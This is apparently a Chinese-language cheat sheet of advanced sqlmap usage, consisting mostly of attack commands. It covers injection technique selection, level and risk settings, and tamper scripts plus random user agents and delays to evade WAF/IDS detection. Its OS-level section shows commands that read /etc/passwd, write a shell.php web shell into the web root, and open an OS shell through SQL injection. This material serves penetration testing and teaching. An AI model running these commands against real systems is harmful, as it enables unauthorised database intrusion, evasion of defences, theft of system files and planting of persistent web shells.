# sqlmap 高级技巧

## 注入技术选择

sqlmap 支持 6 种注入技术，用 `--technique` 指定：

| 字母 | 技术 | 说明 |
|------|------|------|
| B | Boolean-based blind | 通过 true/false 响应差异判断 |
| E | Error-based | 利用数据库报错信息 |
| U | Union query-based | 通过 UNION SELECT 直接获取数据 |
| S | Stacked queries | 分号分隔执行多条语句 |
| T | Time-based blind | 通过响应延迟判断 |
| Q | Inline queries | 内联子查询 |

```bash
# 只用 Union 和 Error-based（最快）
sqlmap -u "URL" --technique=UE --batch

# 只用 Time-based（最隐蔽但最慢）
sqlmap -u "URL" --technique=T --batch
```

## Level 和 Risk

```bash
# Level 1-5: 测试范围
# 1: 默认, 只测 GET/POST 参数
# 2: 加测 Cookie
# 3: 加测 User-Agent, Referer
# 5: 所有 HTTP 头

# Risk 1-3: 测试强度
# 1: 默认, 安全的 payload
# 2: 增加 heavy time-based
# 3: 增加 OR-based（可能修改数据！）

sqlmap -u "URL" --level=3 --risk=2 --batch
```

## WAF/IDS 绕过

```bash
# 使用 tamper 脚本
sqlmap -u "URL" --tamper=space2comment,between --batch

# 常用 tamper 脚本:
# space2comment    — 空格替换为注释 /**/
# between          — > 替换为 NOT BETWEEN 0 AND
# randomcase       — 关键字随机大小写
# charencode       — URL 编码
# equaltolike      — = 替换为 LIKE
# base64encode     — Base64 编码 payload
# space2hash       — 空格替换为 # + 随机字符 (MySQL)

# 组合多个 tamper
sqlmap -u "URL" --tamper=space2comment,randomcase,between --batch

# 随机 User-Agent + 延迟（降低检测率）
sqlmap -u "URL" --random-agent --delay=2 --batch
```

## HTTP 认证场景

```bash
# Basic/Digest 认证
sqlmap -u "URL" --auth-type=Basic --auth-cred="admin:password" --batch

# 自定义 Header
sqlmap -u "URL" --headers="Authorization: Bearer eyJ..." --batch

# 从 Burp 请求文件
sqlmap -r request.txt --batch
```

## 使用 Burp 请求文件

从 Burp Suite 导出请求，用 `-r` 参数：

```bash
sqlmap -r burp_request.txt --batch
```

`burp_request.txt` 内容格式：
```
POST /login HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded
Cookie: session=abc123

username=admin&password=test
```

## 操作系统级利用

```bash
# 读取文件（需要 FILE 权限）
sqlmap -u "URL" --file-read="/etc/passwd" --batch

# 写入文件（需要 FILE 权限）
sqlmap -u "URL" --file-write="shell.php" --file-dest="/var/www/html/shell.php" --batch

# 获取 OS Shell（需要 stacked queries + FILE 权限）
sqlmap -u "URL" --os-shell --batch

# 获取 SQL Shell
sqlmap -u "URL" --sql-shell --batch
```

## 性能优化

```bash
# 多线程（默认1，最大10）
sqlmap -u "URL" --threads=5 --batch

# 指定 DBMS 跳过检测
sqlmap -u "URL" --dbms=mysql --batch

# 跳过 URL 编码
sqlmap -u "URL" --skip-urlencode --batch

# 输出详细度
sqlmap -u "URL" -v 3 --batch  # 0-6, 3=payload details
```
